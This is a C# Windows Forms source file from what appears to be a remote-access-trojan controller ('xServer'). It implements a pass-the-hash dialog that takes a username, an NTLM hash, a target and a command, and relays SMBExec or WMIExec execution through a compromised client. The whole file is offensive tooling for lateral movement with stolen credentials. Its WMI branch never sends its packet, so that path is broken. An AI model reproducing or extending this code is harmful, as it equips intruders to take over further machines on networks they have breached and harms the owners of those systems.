using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using xServer.Core.Networking;
using xServer.Core.Data;

namespace xServer.Forms
{
    public partial class FrmPTH : Form
    {
        private Client c;
        private string technique;
        public FrmPTH(Client client, string technique)
        {
            c = client;
            this.technique = technique;
            InitializeComponent();
        }

        private void btnExecutePTHWmi_Click(object sender, EventArgs e)
        {
           if(technique == "SMB")
            {
                bool comspec = false;
                bool smb1 = false;
                int sleep = 0;
                if (chkComspec.Checked) { comspec = true; }
                if (chkSMB.Checked) { smb1 = true; }
                if(!string.IsNullOrEmpty(txtUsername.Text) && !string.IsNullOrEmpty(txtHash.Text) && !string.IsNullOrEmpty(txtTarget.Text))
                {
                    MessageBox.Show("Sending...");
                    if (int.TryParse(txtSleep.Text, out sleep))
                    {
                        new Core.Packets.ServerPackets.DoSMBExec(txtCommand.Text, txtUsername.Text, txtHash.Text, txtTarget.Text, txtDomain.Text, txtService.Text,comspec, smb1, sleep).Execute(c);
                    }
                    else
                    {
                        new Core.Packets.ServerPackets.DoSMBExec(txtCommand.Text, txtUsername.Text, txtHash.Text, txtTarget.Text, txtDomain.Text, txtService.Text, comspec, smb1, 10).Execute(c);
                    }
                }
                else
                {
                    MessageBox.Show("Please enter all required Parameters!");
                }
            }
           else if (technique == "WMI")
            {
                int sleep = 0;
                if (!string.IsNullOrEmpty(txtUsername.Text) && !string.IsNullOrEmpty(txtHash.Text) && !string.IsNullOrEmpty(txtTarget.Text))
                {

                    if (int.TryParse(txtSleep.Text, out sleep))
                    {
                        new Core.Packets.ServerPackets.DoWMIExec(txtCommand.Text,txtUsername.Text,txtHash.Text,txtTarget.Text,txtDomain.Text,sleep);
                        this.Close();
                    }
                    else
                    {
                        new Core.Packets.ServerPackets.DoWMIExec(txtCommand.Text, txtUsername.Text, txtHash.Text, txtTarget.Text, txtDomain.Text, 10);
                        this.Close();
                    }
                }
                else
                {
                    MessageBox.Show("Please enter all required Parameters!");
                }
            }
           else
            {
                this.Close();
            }
            if (!string.IsNullOrEmpty(txtUsername.Text))
            {

            }
        }

        private void FrmPTH_Load(object sender, EventArgs e)
        {
            if(technique == "SMB")
            {
                txtService.Visible = true;
                lblService.Visible = true;
                chkComspec.Visible = true;
                chkSMB.Visible = true;
                FrmPTH.ActiveForm.Height = 355;
            }
            else
            {
                txtService.Visible = false;
                lblService.Visible = false;
                chkComspec.Visible = false;
                chkSMB.Visible = false;
                FrmPTH.ActiveForm.Height = 314;
            }
        }
    }
}
